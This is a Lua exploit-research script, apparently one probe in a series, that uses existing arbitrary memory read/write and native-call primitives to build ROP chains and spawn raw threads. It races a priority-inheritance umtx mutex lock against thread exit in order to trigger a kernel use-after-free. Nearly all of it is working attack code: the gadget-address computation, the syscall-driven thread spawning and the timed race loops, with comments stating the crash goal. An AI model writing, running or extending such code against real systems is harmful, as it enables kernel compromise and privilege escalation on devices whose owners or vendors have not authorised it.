-- CRASH_CLASS: HIGH
-- PROBE 99f: PI mutex TOCTOU race — contender vs thr_exit
--
-- 99e proved: contending on orphaned PI mutexes enters the kernel PI path
-- (CONTESTED bit set, vmd=18-42) but doesn't crash — likely because
-- tdfind(TID) safely returns NULL for dead threads.
--
-- This probe targets the TOCTOU window: the kernel does tdfind() → gets
-- a live td pointer → then uses it for PI boosting. If the owner thread
-- exits between the lookup and the boost, the td is freed while in use.
--
-- Strategy: tight timing loop. Each round:
-- (A) Child HOLDER: LOCK PI mutex → nanosleep(tiny) → thr_exit
-- (B) Child RACER: loops trying to LOCK the same mutex
-- The racer's LOCK will contend when the holder has it. If the racer
-- enters the kernel PI path during the ~microseconds of thr_exit(),
-- the kernel may dereference a freed td.
--
-- We run many rounds to maximize hitting the window.

print("=== PROBE 99f: PI TOCTOU RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)
local sc_umtx=mk(454)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- 4 child slots: 0=holder, 1=racer, 2=spare, 3=spare
local SLOTS=4
local STK_PG=2; local PG_PER=STK_PG+1
local TOTAL_PG=4+SLOTS*PG_PER
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)

-- Timespecs
local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
-- Tiny sleep for holder: 0 sec, 100 microseconds = 100000 ns
local sl_tiny=R+0x20; wq(sl_tiny,uint64(0)); wq(sl_tiny+8,uint64(100000))
-- 1ms sleep for holder variant
local sl_1ms=R+0x40; wq(sl_1ms,uint64(0)); wq(sl_1ms+8,uint64(1000000))
-- 20ms for main thread waits
local sl20=R+0x60; wq(sl20,uint64(0)); wq(sl20+8,uint64(20000000))
-- 50ms
local sl50=R+0x80; wq(sl50,uint64(0)); wq(sl50+8,uint64(50000000))

local tb=R+0xA0
local MTX_ADDR=R+0x1000   -- single PI mutex, reused each round
local EXIT_H=R+0x1100     -- holder exit state
local EXIT_R=R+0x1108     -- racer result
local RACE_COUNT=R+0x1110 -- racer iteration counter
local CONTESTED_FLAG=R+0x1118  -- racer saw contested

local function child_stk(i) return R+0x4000*(4+i*PG_PER) end
local function child_ctx(i) return R+0x4000*(4+i*PG_PER+STK_PG) end

local function setup_ctx(slot, rax, rdi, rsi, rdx, r10, r8)
    local ctx=child_ctx(slot)
    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(child_stk(slot)))
    wq(ctx+_AX,uint64(rax))
    wq(ctx+_DI,uint64(rdi))
    wq(ctx+_SI,uint64(rsi))
    wq(ctx+_DX,uint64(rdx or 0))
    wq(ctx+_R10,uint64(r10 or 0))
    wq(ctx+_R8,uint64(r8 or 0))
end

local function spawn_child(slot, stk_chain)
    local stk=child_stk(slot)
    local ctx=child_ctx(slot)
    local off=0
    for _,v in ipairs(stk_chain) do
        wq(stk+off, v); off=off+8
    end
    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx), uint64(tb), uint64(0)) end)
    return rq(tb)
end

print(string.format("region=0x%X", R))

-- ============================================================
-- We need a gadget to do a tight LOCK loop in the racer child.
-- The racer can't loop in Lua — it's a bare ROP thread.
-- Strategy: racer does LOCK → UNLOCK → LOCK → UNLOCK → ... → thr_exit
-- Each LOCK/UNLOCK is one PI contention attempt.
-- We chain multiple LOCK/UNLOCK cycles on the stack.
--
-- Each cycle: PRSI→5, PRAX→454, SA (LOCK), PRSI→6, PRAX→454, SA (UNLOCK)
-- = 12 qwords = 96 bytes per cycle
-- With 2 pages (32KB) of stack, we can fit ~340 cycles.
-- Use 200 cycles = 2400 bytes (safe).
-- ============================================================

local CYCLES_PER_RACER=200

local function build_racer_chain(slot)
    local stk=child_stk(slot)
    local off=0

    for _=1,CYCLES_PER_RACER do
        -- LOCK: op=5, RDI already set to MTX_ADDR in context
        wq(stk+off, PRSI); off=off+8
        wq(stk+off, uint64(5)); off=off+8
        wq(stk+off, PRAX); off=off+8
        wq(stk+off, uint64(454)); off=off+8
        wq(stk+off, SA); off=off+8

        -- UNLOCK: op=6
        wq(stk+off, PRSI); off=off+8
        wq(stk+off, uint64(6)); off=off+8
        wq(stk+off, PRAX); off=off+8
        wq(stk+off, uint64(454)); off=off+8
        wq(stk+off, SA); off=off+8
    end

    -- After all cycles: write 1 to EXIT_R → thr_exit
    wq(stk+off, PRDI); off=off+8
    wq(stk+off, uint64(EXIT_R)); off=off+8
    wq(stk+off, PRAX); off=off+8
    wq(stk+off, uint64(431)); off=off+8
    wq(stk+off, SA); off=off+8

    -- Safety tail
    wq(stk+off, PRDI); off=off+8
    wq(stk+off, uint64(ts999)); off=off+8
    wq(stk+off, PRSI); off=off+8
    wq(stk+off, uint64(0)); off=off+8
    wq(stk+off, PRAX); off=off+8
    wq(stk+off, uint64(240)); off=off+8
    wq(stk+off, SA); off=off+8

    return off
end

-- ============================================================
print("")
print("--- TIGHT RACE: holder exits while racer contends ---")
-- Each round:
-- 1. Init fresh PI mutex
-- 2. Spawn RACER first (it will try LOCK immediately — gets it uncontested)
-- 3. Brief wait for racer to start cycling
-- 4. Spawn HOLDER which LOCKs (contended if racer holds), holds briefly, exits
-- Actually better:
-- 1. Spawn HOLDER: LOCK → tiny_sleep → thr_exit
-- 2. Immediately spawn RACER: LOCK → contend → UNLOCK → LOCK → ...
-- 3. The racer's first LOCK contends (holder has it)
-- 4. After tiny_sleep, holder exits — racer might be in kernel PI path
-- ============================================================

local ROUNDS=20
local total_contested=0
local total_racer_exits=0
local vm_start=vmc()

for round=1,ROUNDS do
    -- Fresh PI mutex
    z(MTX_ADDR, 32)
    wd(MTX_ADDR, 0)       -- UNOWNED
    wd(MTX_ADDR+4, 4)     -- PRIO_INHERIT
    wq(EXIT_H, uint64(0))
    wq(EXIT_R, uint64(0))

    -- Spawn HOLDER: LOCK → nanosleep(tiny) → write EXIT_H=1 → thr_exit
    setup_ctx(0, 454, MTX_ADDR, 5, 0, 0, 0)
    spawn_child(0, {
        -- After LOCK: tiny sleep
        PRDI, uint64(sl_tiny), PRSI, uint64(0),
        PRAX, uint64(240), SA,
        -- Write exit marker
        PRDI, uint64(EXIT_H),
        PRAX, uint64(431), SA,
        -- Safety
        PRDI, uint64(ts999), PRSI, uint64(0),
        PRAX, uint64(240), SA
    })

    -- Spawn RACER immediately: first syscall is LOCK (will contend with holder)
    -- RDI=MTX_ADDR already in context, first syscall=LOCK
    setup_ctx(1, 454, MTX_ADDR, 5, 0, 0, 0)
    build_racer_chain(1)
    wq(tb, uint64(0))
    pcall(function()
        tc(uint64(child_ctx(1)), uint64(tb), uint64(0))
    end)

    -- Wait for both to finish (holder exits after ~100us, racer cycles 200 times)
    native.fcall_with_rax(stub,240,sl50,0)

    local eh=rd(EXIT_H) or 0
    local er=rd(EXIT_R) or 0
    local owner=rd(MTX_ADDR) or 0
    local vm_now=vmc()
    local c=N(native.fcall_with_rax(stub,20))

    local contested = (owner >= 0x80000000) and 1 or 0
    total_contested = total_contested + contested
    if er==1 then total_racer_exits=total_racer_exits+1 end

    if round<=3 or round%5==0 or round==ROUNDS or c~=pid then
        print(string.format("R%02d: h_exit=%d r_exit=%d owner=0x%X contested=%s vmd=%d pid=%d%s",
            round, eh, er, owner, contested==1 and "YES" or "no",
            vm_now-vm_start, c, c~=pid and " !!CANARY" or ""))
    end

    if c~=pid then
        print("CANARY FAILURE — possible corruption!")
        break
    end

    -- Cleanup: force clear + wake
    wd(MTX_ADDR, 0)
    pcall(function()
        sc_umtx(uint64(MTX_ADDR),uint64(3),uint64(0x7FFFFFFF),uint64(0),uint64(0))
    end)
    native.fcall_with_rax(stub,240,sl20,0)
end

-- ============================================================
print("")
print("--- VARIANT B: holder sleep=1ms (wider window) ---")
-- Same pattern but holder sleeps 1ms instead of 100us
-- ============================================================

local ROUNDS_B=10
local vm_b_start=vmc()

for round=1,ROUNDS_B do
    z(MTX_ADDR, 32)
    wd(MTX_ADDR, 0)
    wd(MTX_ADDR+4, 4)
    wq(EXIT_H, uint64(0))
    wq(EXIT_R, uint64(0))

    -- HOLDER: LOCK → sleep(1ms) → thr_exit
    setup_ctx(0, 454, MTX_ADDR, 5, 0, 0, 0)
    spawn_child(0, {
        PRDI, uint64(sl_1ms), PRSI, uint64(0),
        PRAX, uint64(240), SA,
        PRDI, uint64(EXIT_H),
        PRAX, uint64(431), SA,
        PRDI, uint64(ts999), PRSI, uint64(0),
        PRAX, uint64(240), SA
    })

    -- RACER: 200 LOCK/UNLOCK cycles
    setup_ctx(1, 454, MTX_ADDR, 5, 0, 0, 0)
    build_racer_chain(1)
    wq(tb, uint64(0))
    pcall(function()
        tc(uint64(child_ctx(1)), uint64(tb), uint64(0))
    end)

    native.fcall_with_rax(stub,240,sl50,0)

    local eh=rd(EXIT_H) or 0
    local er=rd(EXIT_R) or 0
    local owner=rd(MTX_ADDR) or 0
    local c=N(native.fcall_with_rax(stub,20))

    local contested = (owner >= 0x80000000) and 1 or 0
    total_contested = total_contested + contested
    if er==1 then total_racer_exits=total_racer_exits+1 end

    print(string.format("B%02d: h_exit=%d r_exit=%d owner=0x%X contested=%s vmd=%d pid=%d%s",
        round, eh, er, owner, contested==1 and "YES" or "no",
        vmc()-vm_b_start, c, c~=pid and " !!CANARY" or ""))

    if c~=pid then
        print("CANARY FAILURE!")
        break
    end

    wd(MTX_ADDR, 0)
    pcall(function()
        sc_umtx(uint64(MTX_ADDR),uint64(3),uint64(0x7FFFFFFF),uint64(0),uint64(0))
    end)
    native.fcall_with_rax(stub,240,sl20,0)
end

-- ============================================================
print("")
print("--- VARIANT C: NO holder sleep (instant exit after lock) ---")
-- Tightest possible window: LOCK → thr_exit immediately
-- ============================================================

local ROUNDS_C=10
local vm_c_start=vmc()

for round=1,ROUNDS_C do
    z(MTX_ADDR, 32)
    wd(MTX_ADDR, 0)
    wd(MTX_ADDR+4, 4)
    wq(EXIT_H, uint64(0))
    wq(EXIT_R, uint64(0))

    -- HOLDER: LOCK → immediately thr_exit (no sleep)
    setup_ctx(0, 454, MTX_ADDR, 5, 0, 0, 0)
    spawn_child(0, {
        PRDI, uint64(EXIT_H),
        PRAX, uint64(431), SA,
        PRDI, uint64(ts999), PRSI, uint64(0),
        PRAX, uint64(240), SA
    })

    -- RACER: 200 cycles
    setup_ctx(1, 454, MTX_ADDR, 5, 0, 0, 0)
    build_racer_chain(1)
    wq(tb, uint64(0))
    pcall(function()
        tc(uint64(child_ctx(1)), uint64(tb), uint64(0))
    end)

    native.fcall_with_rax(stub,240,sl50,0)

    local eh=rd(EXIT_H) or 0
    local er=rd(EXIT_R) or 0
    local owner=rd(MTX_ADDR) or 0
    local c=N(native.fcall_with_rax(stub,20))

    local contested = (owner >= 0x80000000) and 1 or 0
    total_contested = total_contested + contested
    if er==1 then total_racer_exits=total_racer_exits+1 end

    print(string.format("C%02d: h_exit=%d r_exit=%d owner=0x%X contested=%s vmd=%d pid=%d%s",
        round, eh, er, owner, contested==1 and "YES" or "no",
        vmc()-vm_c_start, c, c~=pid and " !!CANARY" or ""))

    if c~=pid then
        print("CANARY FAILURE!")
        break
    end

    wd(MTX_ADDR, 0)
    pcall(function()
        sc_umtx(uint64(MTX_ADDR),uint64(3),uint64(0x7FFFFFFF),uint64(0),uint64(0))
    end)
    native.fcall_with_rax(stub,240,sl20,0)
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s contested=%d racer_exits=%d vm_total=%d",
    fc==pid and "OK" or "!!FAIL="..fc, total_contested, total_racer_exits, vmc()-vm_start))
print("=== 99f COMPLETE ===")
